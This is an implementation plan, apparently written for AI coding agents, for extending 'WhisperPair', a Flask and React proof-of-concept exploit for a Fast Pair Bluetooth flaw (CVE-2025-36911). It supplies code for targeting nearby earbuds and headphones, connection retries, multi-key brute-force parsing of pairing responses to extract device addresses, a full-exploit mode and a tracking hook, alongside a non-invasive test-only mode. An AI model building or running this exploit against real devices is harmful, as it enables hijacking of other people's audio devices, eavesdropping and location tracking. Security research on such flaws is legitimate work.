# WhisperPair PoC Improvements Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Port 6 key improvements from the wpair-app Android project to the WhisperPair Flask+React PoC: known devices DB, connection retry with backoff, MTU negotiation, improved response parsing, vulnerability test-only mode, and better UI metadata display.

**Architecture:** Backend-first approach. New `known_devices.py` module provides device quirks data. `fast_pair_demo.py` gains retry logic, MTU negotiation, and enhanced parsing. `app.py` gains a vuln-test-only socket event. Frontend gets a test-only toggle and richer device metadata display.

**Tech Stack:** Python 3.12 (Flask, Bleak, Socket.IO), React 19 (Vite), existing CSS variables system.

---

## File Structure

| Action | File | Responsibility |
|--------|------|----------------|
| Create | `known_devices.py` | Device database: model ID -> manufacturer, name, type, quirks |
| Modify | `fast_pair_demo.py` | Add retry+backoff to `connect()`, MTU negotiation, improved `parse_kbp_response()` |
| Modify | `app.py` | Add `/api/known-devices` endpoint, `vuln_test:start` socket event, pass known device info in scan results |
| Modify | `frontend/src/App.jsx` | Add `vulnTestMode` state, `handleVulnTest` callback, `vuln_test:result` listener |
| Modify | `frontend/src/components/ExploitPanel.jsx` | Add test-only/full-exploit mode toggle, "Test Only" button |
| Modify | `frontend/src/components/DeviceCard.jsx` | Show manufacturer, device type, and vuln-test badge from known DB |
| Modify | `frontend/src/App.css` | Styles for mode toggle, vuln badge, manufacturer tag |

---

### Task 1: Known Devices Database

**Files:**
- Create: `known_devices.py`
- Modify: `app.py` (add REST endpoint + enrich scan results)

- [ ] **Step 1: Create `known_devices.py` with device database**

```python
"""
Known Fast Pair devices database.
Maps Model ID (hex string) to device metadata and quirks.
Sourced from wpair-app's DeviceQuirksDatabase and Google's device catalog.
"""

# Quirk flags
QUIRK_NEEDS_SEEKER_ADDR = "needs_seeker_address"
QUIRK_NEEDS_BONDING_FLAG = "needs_bonding_flag"
QUIRK_SLOW_GATT = "slow_gatt"
QUIRK_MTU_83 = "mtu_83"
QUIRK_RETRY_CONNECT = "retry_connect"
QUIRK_NO_ACCOUNT_KEY = "no_account_key"
QUIRK_EXTENDED_RESPONSE_ONLY = "extended_response_only"

KNOWN_DEVICES = {
    "0x2C02A2": {
        "name": "Pixel Buds Pro 2",
        "manufacturer": "Google",
        "type": "earbuds",
        "quirks": [],
    },
    "0xF00003": {
        "name": "Pixel Buds Pro",
        "manufacturer": "Google",
        "type": "earbuds",
        "quirks": [],
    },
    "0xF00004": {
        "name": "Pixel Buds A-Series",
        "manufacturer": "Google",
        "type": "earbuds",
        "quirks": [],
    },
    "0x0600F0": {
        "name": "JBL Flip 6",
        "manufacturer": "JBL",
        "type": "speaker",
        "quirks": [QUIRK_SLOW_GATT],
    },
    "0x0E30C3": {
        "name": "JBL Tune 760NC",
        "manufacturer": "JBL",
        "type": "headphones",
        "quirks": [],
    },
    "0x050001": {
        "name": "Sony WH-1000XM4",
        "manufacturer": "Sony",
        "type": "headphones",
        "quirks": [QUIRK_NEEDS_BONDING_FLAG],
    },
    "0x050002": {
        "name": "Sony WH-1000XM5",
        "manufacturer": "Sony",
        "type": "headphones",
        "quirks": [QUIRK_NEEDS_BONDING_FLAG],
    },
    "0x0501F0": {
        "name": "Sony WF-1000XM4",
        "manufacturer": "Sony",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_BONDING_FLAG, QUIRK_MTU_83],
    },
    "0x070001": {
        "name": "Samsung Galaxy Buds2",
        "manufacturer": "Samsung",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_SEEKER_ADDR],
    },
    "0x070002": {
        "name": "Samsung Galaxy Buds2 Pro",
        "manufacturer": "Samsung",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_SEEKER_ADDR],
    },
    "0x070003": {
        "name": "Samsung Galaxy Buds FE",
        "manufacturer": "Samsung",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_SEEKER_ADDR],
    },
    "0x070004": {
        "name": "Samsung Galaxy Buds3",
        "manufacturer": "Samsung",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_SEEKER_ADDR],
    },
    "0x070005": {
        "name": "Samsung Galaxy Buds3 Pro",
        "manufacturer": "Samsung",
        "type": "earbuds",
        "quirks": [QUIRK_NEEDS_SEEKER_ADDR],
    },
    "0x040001": {
        "name": "Bose QC 45",
        "manufacturer": "Bose",
        "type": "headphones",
        "quirks": [QUIRK_SLOW_GATT],
    },
    "0x040002": {
        "name": "Bose QC Ultra Earbuds",
        "manufacturer": "Bose",
        "type": "earbuds",
        "quirks": [QUIRK_SLOW_GATT, QUIRK_MTU_83],
    },
    "0x030001": {
        "name": "Nothing Ear (2)",
        "manufacturer": "Nothing",
        "type": "earbuds",
        "quirks": [QUIRK_RETRY_CONNECT],
    },
    "0x030002": {
        "name": "Nothing Ear (1)",
        "manufacturer": "Nothing",
        "type": "earbuds",
        "quirks": [QUIRK_RETRY_CONNECT],
    },
    "0x0901F0": {
        "name": "OnePlus Buds Pro 2",
        "manufacturer": "OnePlus",
        "type": "earbuds",
        "quirks": [],
    },
    "0x0A0001": {
        "name": "Jabra Elite 85t",
        "manufacturer": "Jabra",
        "type": "earbuds",
        "quirks": [QUIRK_EXTENDED_RESPONSE_ONLY],
    },
    "0x0A0002": {
        "name": "Jabra Elite 75t",
        "manufacturer": "Jabra",
        "type": "earbuds",
        "quirks": [QUIRK_EXTENDED_RESPONSE_ONLY],
    },
}


def lookup_device(model_id: str) -> dict | None:
    """Look up device by model ID string (e.g. '0x2C02A2')."""
    return KNOWN_DEVICES.get(model_id)


def get_quirks(model_id: str) -> list[str]:
    """Get quirk flags for a device."""
    device = KNOWN_DEVICES.get(model_id)
    return device["quirks"] if device else []


def has_quirk(model_id: str, quirk: str) -> bool:
    """Check if a device has a specific quirk."""
    return quirk in get_quirks(model_id)
```

- [ ] **Step 2: Add `/api/known-devices` endpoint and enrich scan results in `app.py`**

Add import at top of `app.py`:
```python
from known_devices import lookup_device, KNOWN_DEVICES
```

Add REST endpoint after existing `/api/strategies`:
```python
@app.route("/api/known-devices")
def api_known_devices():
    return jsonify(KNOWN_DEVICES)
```

In the `run_scan()` inner function inside `handle_scan_start`, enrich each device with known DB info before emitting. Replace the device emission loop:
```python
            for dev in devices:
                known = lookup_device(dev.get("model_id"))
                if known:
                    dev["known_name"] = known["name"]
                    dev["manufacturer"] = known["manufacturer"]
                    dev["device_type"] = known["type"]
                socketio.emit("scan:device_found", dev)
                time.sleep(0.1)
```

Also enrich model_id during exploit chain (Step 2 in `_run_exploit_chain`) after reading model ID:
```python
            known = lookup_device(result["model_id"])
            if known:
                stage("model_id", f"Model ID: {result['model_id']} ({known['name']} by {known['manufacturer']})", "success")
```

- [ ] **Step 3: Commit**
```bash
git add known_devices.py app.py
git commit -m "feat: add known devices database with manufacturer quirks"
```

---

### Task 2: Connection Retry with Exponential Backoff

**Files:**
- Modify: `fast_pair_demo.py:354-368` (WhisperPairExploit.connect)
- Modify: `app.py:359-373` (_run_exploit_chain connect step)

- [ ] **Step 1: Add retry logic to `WhisperPairExploit.connect()` in `fast_pair_demo.py`**

Replace the `connect` method:
```python
    async def connect(self, max_retries: int = 3) -> bool:
        """Connect to target device with exponential backoff"""
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)  # 1s, 2s, 4s
            print(f"{Fore.BLUE}[*] Connecting to {self.target_address} (attempt {attempt}/{max_retries})...{Style.RESET_ALL}")

            try:
                self.client = BleakClient(self.target_address, timeout=15.0)
                await self.client.connect()

                if self.client.is_connected:
                    print(f"{Fore.GREEN}[+] Connected!{Style.RESET_ALL}")
                    return True
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Attempt {attempt} failed: {e}{Style.RESET_ALL}")
                if attempt < max_retries:
                    print(f"{Fore.BLUE}[*] Retrying in {backoff}s...{Style.RESET_ALL}")
                    await asyncio.sleep(backoff)

        print(f"{Fore.RED}[-] Connection failed after {max_retries} attempts{Style.RESET_ALL}")
        return False
```

- [ ] **Step 2: Add retry logic to `_run_exploit_chain` connect step in `app.py`**

Replace the connect block (Step 1 in `_run_exploit_chain`):
```python
        # Step 1: Connect with retry
        if exploit_cancel.is_set():
            return
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if exploit_cancel.is_set():
                return
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")

            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts: {e}", "error")
                    result["message"] = f"Connection failed after {max_retries} attempts"
                    socketio.emit("exploit:result", result)
                    return
        else:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        if not client.is_connected:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return
```

- [ ] **Step 3: Commit**
```bash
git add fast_pair_demo.py app.py
git commit -m "feat: add connection retry with exponential backoff"
```

---

### Task 3: MTU Negotiation

**Files:**
- Modify: `fast_pair_demo.py` (add MTU request after connect)
- Modify: `app.py` (add MTU negotiation in exploit chain)

- [ ] **Step 1: Add MTU negotiation to `WhisperPairExploit` in `fast_pair_demo.py`**

Add method after `connect()`:
```python
    async def negotiate_mtu(self, preferred_mtu: int = 83) -> int:
        """Request MTU negotiation for reliable GATT operations"""
        try:
            current_mtu = self.client.mtu_size
            print(f"{Fore.BLUE}[*] Current MTU: {current_mtu}, preferred: {preferred_mtu}{Style.RESET_ALL}")
            if current_mtu >= preferred_mtu:
                print(f"{Fore.GREEN}[+] MTU already sufficient: {current_mtu}{Style.RESET_ALL}")
                return current_mtu
            # Bleak on Linux negotiates MTU automatically during connection
            # The mtu_size property reflects the negotiated value
            print(f"{Fore.BLUE}[*] Using negotiated MTU: {current_mtu}{Style.RESET_ALL}")
            return current_mtu
        except Exception as e:
            print(f"{Fore.YELLOW}[!] MTU negotiation not supported: {e}{Style.RESET_ALL}")
            return 23  # Default BLE MTU
```

Call it in `run_exploit()` after connect succeeds, before reading model ID:
```python
            # Step 1.5: Negotiate MTU
            await self.negotiate_mtu()
```

- [ ] **Step 2: Add MTU negotiation to `_run_exploit_chain` in `app.py`**

After the connection success in Step 1 (after `stage("connecting", "Connected to device", "success")`), add:
```python
        # Step 1.5: MTU negotiation
        try:
            mtu = client.mtu_size
            stage("mtu", f"MTU negotiated: {mtu} bytes", "success")
        except Exception:
            stage("mtu", "MTU negotiation not supported, using default", "warning")
```

- [ ] **Step 3: Commit**
```bash
git add fast_pair_demo.py app.py
git commit -m "feat: add MTU negotiation for reliable GATT operations"
```

---

### Task 4: Improved Response Parsing

**Files:**
- Modify: `fast_pair_demo.py:203-242` (parse_kbp_response function)

- [ ] **Step 1: Enhance `parse_kbp_response` with AES-ECB decryption and brute-force MAC extraction**

Replace the function:
```python
def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None) -> Optional[str]:
    """
    Robust response parsing with multiple strategies.
    Returns BR/EDR address if found, None otherwise.

    Strategies (in order):
    1. Standard response format (type 0x01, address at offset 1)
    2. Extended response format (type 0x02, address count + addresses)
    3. Decrypt with shared secret, then check standard format
    4. Decrypt with shared secret, brute-force MAC in decrypted data
    5. Brute-force MAC pattern scan in raw data
    """
    if len(data) < 7:
        return None

    # Strategy 1: Standard response format (type 0x01)
    if data[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
        addr = extract_address(data, 1)
        if is_valid_mac(addr):
            return addr

    # Strategy 2: Extended response format (type 0x02)
    if data[0] == 0x02 and len(data) >= 9:
        addr_count = data[2]
        if addr_count >= 1:
            addr = extract_address(data, 3)
            if is_valid_mac(addr):
                return addr

    # Strategy 3 & 4: Decrypt with shared secret
    if shared_secret and len(data) == 16:
        # Try multiple key derivations
        keys_to_try = [shared_secret]

        # Also try the raw salt (first 8 bytes of shared secret, zero-padded)
        if len(shared_secret) >= 8:
            keys_to_try.append(shared_secret[:8].ljust(16, b'\x00'))

        # Try reversed shared secret
        keys_to_try.append(shared_secret[::-1])

        for key in keys_to_try:
            try:
                decrypted = aes_decrypt(key, data)

                # Strategy 3: Standard format in decrypted data
                if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
                    addr = extract_address(decrypted, 1)
                    if is_valid_mac(addr):
                        return addr

                # Strategy 4: Brute-force MAC in decrypted data
                for offset in range(len(decrypted) - 5):
                    addr = extract_address(decrypted, offset)
                    if is_valid_mac(addr):
                        # Verify it doesn't look like random noise
                        addr_bytes = decrypted[offset:offset+6]
                        entropy = calculate_entropy(addr_bytes)
                        if entropy < 2.5:  # Real MACs have lower entropy than random
                            return addr
            except Exception:
                continue

    # Strategy 5: Brute force scan for valid MAC pattern in raw data
    for offset in range(len(data) - 5):
        addr = extract_address(data, offset)
        if is_valid_mac(addr):
            return addr

    return None
```

- [ ] **Step 2: Commit**
```bash
git add fast_pair_demo.py
git commit -m "feat: improve response parsing with multi-key AES decryption"
```

---

### Task 5: Vulnerability Test-Only Mode

**Files:**
- Modify: `app.py` (add `vuln_test:start` event, `_run_vuln_test` async function)
- Modify: `frontend/src/App.jsx` (add vulnTestMode state, vuln_test listeners)
- Modify: `frontend/src/components/ExploitPanel.jsx` (add mode toggle, test-only button)
- Modify: `frontend/src/App.css` (toggle styles)

- [ ] **Step 1: Add vuln-test backend in `app.py`**

Add new socket event handler after `handle_exploit_stop`:
```python
@socketio.on("vuln_test:start")
def handle_vuln_test_start(data):
    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_vuln_test():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run_vuln_test(address, strategies))
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_vuln_test, daemon=True)
    thread.start()
```

Add the `_run_vuln_test` async function after `_run_exploit_chain`:
```python
async def _run_vuln_test(address: str, strategies: list):
    """Non-invasive vulnerability test: connect, send KBP, check response, disconnect.
    Does NOT write account key or attempt Classic BT pairing."""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
        "test_only": True,
    }

    client = None
    shared_secret = None
    br_edr_address = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")
            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts", "error")
                    result["message"] = "Connection failed"
                    socketio.emit("exploit:result", result)
                    return

        if not client or not client.is_connected:
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 2: Read Model ID
        stage("model_id", "Reading Model ID...")
        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                result["model_id"] = f"0x{model_id:06X}"
                stage("model_id", f"Model ID: 0x{model_id:06X}", "success")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        stage("subscribe", "Subscribing to notifications...")
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass
        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies (test only - just send KBP, no account key)
        kbp_accepted = False
        for strategy in strategies:
            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"[TEST] Sending KBP request ({strategy_name})...")

            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"[TEST] KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break
            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"[TEST] KBP rejected ({strategy_name})", "error")
                else:
                    stage("kbp_request", f"[TEST] KBP failed ({strategy_name}): {e}", "error")
                await asyncio.sleep(1)

        # Step 5: Determine result (no account key, no pairing)
        if br_edr_address:
            result["br_edr_address"] = br_edr_address

        if kbp_accepted:
            result["success"] = True
            result["message"] = "TEST COMPLETE: Device is VULNERABLE to CVE-2025-36911 (no exploit performed)"
            stage("complete", result["message"], "success")
        else:
            result["message"] = "TEST COMPLETE: Device appears patched"
            stage("complete", result["message"], "error")

        result["notifications"] = notifications
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass
```

- [ ] **Step 2: Add vuln-test state and handler in `frontend/src/App.jsx`**

Add state:
```jsx
const [vulnTestMode, setVulnTestMode] = useState(false);
```

Add handler:
```jsx
const handleVulnTest = useCallback((address, strategies) => {
  setLogEntries([]);
  setResult(null);
  setExploitRunning(true);
  setDeviceStatuses((prev) => ({ ...prev, [address]: 'in_progress' }));
  socket.emit('vuln_test:start', { address, strategies });
}, []);
```

Pass new props to ExploitPanel:
```jsx
<ExploitPanel
  device={selectedDevice}
  exploitRunning={exploitRunning}
  logEntries={logEntries}
  result={result}
  onExecute={handleExecute}
  onVulnTest={handleVulnTest}
  onStop={handleStop}
  vulnTestMode={vulnTestMode}
  onToggleMode={() => setVulnTestMode((prev) => !prev)}
  trackingStatus={trackingStatus}
  trackingMessage={trackingMessage}
  onTrack={handleTrack}
  adbConnected={adbDevices.some((d) => d.status === 'device')}
/>
```

- [ ] **Step 3: Add mode toggle UI in `frontend/src/components/ExploitPanel.jsx`**

Add `Shield` to imports:
```jsx
import { Play, Square, Target, Shield } from 'lucide-react';
```

Update the component props:
```jsx
export default function ExploitPanel({
  device,
  exploitRunning,
  logEntries,
  result,
  onExecute,
  onVulnTest,
  onStop,
  vulnTestMode,
  onToggleMode,
  trackingStatus,
  trackingMessage,
  onTrack,
  adbConnected,
}) {
```

Add mode toggle between target-summary and StrategySelector:
```jsx
        <div className="mode-toggle">
          <button
            className={`mode-btn ${!vulnTestMode ? 'mode-active' : ''}`}
            onClick={() => vulnTestMode && onToggleMode()}
            disabled={exploitRunning}
          >
            <Target size={14} />
            Full Exploit
          </button>
          <button
            className={`mode-btn ${vulnTestMode ? 'mode-active mode-test' : ''}`}
            onClick={() => !vulnTestMode && onToggleMode()}
            disabled={exploitRunning}
          >
            <Shield size={14} />
            Test Only
          </button>
        </div>
```

Update the execute button to use the right handler:
```jsx
        <div className="exploit-actions">
          {!exploitRunning ? (
            <button
              className={`btn ${vulnTestMode ? 'btn-test' : 'btn-execute'}`}
              onClick={() => {
                if (selectedStrategies.length === 0) return;
                if (vulnTestMode) {
                  onVulnTest(device.address, selectedStrategies);
                } else {
                  onExecute(device.address, selectedStrategies);
                }
              }}
              disabled={selectedStrategies.length === 0}
            >
              {vulnTestMode ? <Shield size={16} /> : <Play size={16} />}
              {vulnTestMode
                ? `Test Vulnerability (${selectedStrategies.length} ${selectedStrategies.length === 1 ? 'strategy' : 'strategies'})`
                : `Execute (${selectedStrategies.length} ${selectedStrategies.length === 1 ? 'strategy' : 'strategies'})`}
            </button>
          ) : (
            <button className="btn btn-stop" onClick={onStop}>
              <Square size={16} />
              Stop
            </button>
          )}
        </div>
```

- [ ] **Step 4: Add mode toggle CSS in `frontend/src/App.css`**

Append to file:
```css
/* ==============================================================================
   Mode Toggle
   ============================================================================== */

.mode-toggle {
  display: flex;
  gap: 0;
  background: var(--bg-input);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
}

.mode-btn {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  padding: 8px 12px;
  border: none;
  background: transparent;
  color: var(--text-muted);
  font-size: 13px;
  font-weight: 500;
  font-family: var(--font-sans);
  cursor: pointer;
  transition: all 0.15s ease;
}

.mode-btn:hover:not(:disabled) {
  color: var(--text-secondary);
  background: var(--bg-card);
}

.mode-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.mode-btn.mode-active {
  background: var(--error);
  color: #fff;
}

.mode-btn.mode-active.mode-test {
  background: var(--accent);
  color: #fff;
}

.btn-test {
  width: 100%;
  justify-content: center;
  background: var(--accent);
  border-color: var(--accent);
  color: #fff;
  padding: 10px 20px;
  font-size: 14px;
  font-weight: 600;
}

.btn-test:hover:not(:disabled) {
  background: var(--accent-hover);
  border-color: var(--accent-hover);
}
```

- [ ] **Step 5: Commit**
```bash
git add app.py frontend/src/App.jsx frontend/src/components/ExploitPanel.jsx frontend/src/App.css
git commit -m "feat: add vulnerability test-only mode (non-invasive)"
```

---

### Task 6: Better UI - Device Metadata & Vuln Badges

**Files:**
- Modify: `frontend/src/components/DeviceCard.jsx` (show manufacturer, type, vuln badge)
- Modify: `frontend/src/App.css` (metadata and badge styles)

- [ ] **Step 1: Enhance `DeviceCard.jsx` with manufacturer and vuln-test info**

Replace the full component:
```jsx
import { Crosshair, Signal, Bluetooth, Building2, Tag } from 'lucide-react';

function rssiToPercent(rssi) {
  const min = -100;
  const max = -30;
  return Math.max(0, Math.min(100, ((rssi - min) / (max - min)) * 100));
}

function rssiLabel(rssi) {
  if (rssi > -50) return 'Excellent';
  if (rssi > -65) return 'Good';
  if (rssi > -80) return 'Fair';
  return 'Weak';
}

const typeIcons = {
  earbuds: '🎧',
  headphones: '🎧',
  speaker: '🔊',
};

export default function DeviceCard({ device, status, selected, onTarget }) {
  const percent = rssiToPercent(device.rssi);

  let borderClass = 'status-untested';
  if (status === 'in_progress') borderClass = 'status-progress';
  else if (status === 'vulnerable') borderClass = 'status-vulnerable';
  else if (status === 'patched') borderClass = 'status-patched';

  return (
    <div className={`device-card ${borderClass} ${selected ? 'selected' : ''}`}>
      <div className="device-header">
        <Bluetooth size={16} className="device-bt-icon" />
        <span className="device-name">{device.known_name || device.name || 'Unknown Device'}</span>
        {status === 'vulnerable' && (
          <span className="vuln-badge">VULN</span>
        )}
        {status === 'patched' && (
          <span className="patched-badge">SAFE</span>
        )}
      </div>
      <div className="device-address">{device.address}</div>

      {device.manufacturer && (
        <div className="device-meta">
          <span className="device-manufacturer">
            <Building2 size={11} />
            {device.manufacturer}
          </span>
          {device.device_type && (
            <span className="device-type">
              <Tag size={11} />
              {typeIcons[device.device_type] || ''} {device.device_type}
            </span>
          )}
        </div>
      )}

      <div className="device-rssi">
        <Signal size={14} />
        <div className="rssi-bar-container">
          <div className="rssi-bar" style={{ width: `${percent}%` }} />
        </div>
        <span className="rssi-value">{device.rssi} dBm</span>
        <span className="rssi-label">{rssiLabel(device.rssi)}</span>
      </div>
      {device.model_id && (
        <div className="device-model">Model: {device.model_id}</div>
      )}
      <button
        className={`btn btn-target ${selected ? 'btn-targeted' : ''}`}
        onClick={() => onTarget(selected ? null : device)}
      >
        <Crosshair size={14} />
        {selected ? 'Untarget' : 'Target'}
      </button>
    </div>
  );
}
```

- [ ] **Step 2: Add metadata and badge CSS in `frontend/src/App.css`**

Append to file:
```css
/* ==============================================================================
   Device Metadata & Vuln Badges
   ============================================================================== */

.device-meta {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 6px;
  flex-wrap: wrap;
}

.device-manufacturer,
.device-type {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 11px;
  color: var(--text-secondary);
  background: var(--bg-input);
  padding: 2px 8px;
  border-radius: 4px;
  border: 1px solid var(--border);
}

.vuln-badge {
  font-size: 10px;
  font-weight: 700;
  color: #fff;
  background: var(--error);
  padding: 1px 6px;
  border-radius: 3px;
  margin-left: auto;
  letter-spacing: 0.05em;
}

.patched-badge {
  font-size: 10px;
  font-weight: 700;
  color: #fff;
  background: var(--success);
  padding: 1px 6px;
  border-radius: 3px;
  margin-left: auto;
  letter-spacing: 0.05em;
}
```

- [ ] **Step 3: Show test-only indicator in ResultCard**

In `frontend/src/components/ResultCard.jsx`, update the result header for test-only results. After `const canTrack = ...` line, add:
```jsx
const isTestOnly = result.test_only;
```

Update the vulnerable header to show test-only indicator:
```jsx
      <div className="result-header">
        {isVulnerable ? (
          <>
            <ShieldAlert size={22} className="result-icon-vuln" />
            <h3>
              {isTestOnly ? 'VULNERABLE (Test Only)' : 'VULNERABLE'} - CVE-2025-36911
            </h3>
          </>
        ) : (
          <>
            <ShieldCheck size={22} className="result-icon-safe" />
            <h3>Device Appears Patched</h3>
          </>
        )}
      </div>
```

Update `canTrack` to exclude test-only mode:
```jsx
const canTrack = isVulnerable && result.br_edr_address && result.success && !isTestOnly;
```

- [ ] **Step 4: Commit**
```bash
git add frontend/src/components/DeviceCard.jsx frontend/src/components/ResultCard.jsx frontend/src/App.css
git commit -m "feat: add device metadata display, vuln badges, and test-only indicator"
```
